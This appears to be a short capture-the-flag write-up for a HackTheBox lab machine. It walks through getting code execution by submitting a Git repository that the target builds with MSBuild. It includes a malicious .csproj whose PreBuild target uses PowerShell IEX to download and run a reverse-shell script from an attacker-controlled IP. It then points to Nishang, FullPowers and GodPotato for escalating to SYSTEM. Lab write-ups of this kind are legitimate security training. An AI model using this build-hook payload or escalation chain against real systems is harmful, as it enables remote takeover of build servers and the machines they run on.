The application's backend is executing a /info/refs?service=git-upload-pack request.
This means that the application is cloning a remote Git repository.

We can exploit the way the application clones and builds the project using Visual Studio. https://www.hackingarticles.in/windows-exploitation-msbuild/
*MSBuild's PreBuildEvent can be manipulated to execute custom commands before the actual build process starts. This is done by defining a custom target (PreBuild) that runs before the PreBuildEvent.*

## Malicious .csproj

``` 
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net7.0</TargetFramework>
    <RootNamespace>project_name</RootNamespace>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.14:8000/revshell.ps1')" />
  </Target>

</Project>

```

## Simple C# project https://github.com/kvlx-alt/HackTheBox-Visual

## Rev shell https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

## Host the c# project on a local gitea docker https://github.com/jersonmartinez/gitea-docker-compose
```
docker-compose up -d
```

## Submit the repo URL to the application and await the reverse shell connection
	curl http://visual.htb/uploads/Invoke-PowerShellTcp.ps1

## Escalate privilege
Recover the default privilege set of a LOCAL/NETWORK SERVICE account using FULLPowers
*_**FullPowers**_ is a Proof-of-Concept tool I made for automatically recovering the **default privilege set** of a service account including **SeAssignPrimaryToken** and **SeImpersonate**.*
https://github.com/itm4n/FullPowers

## Now that we have the SeImpersonate privilege we can use # [GodPotato](https://github.com/BeichenDream/GodPotato#godpotato) to abuse it



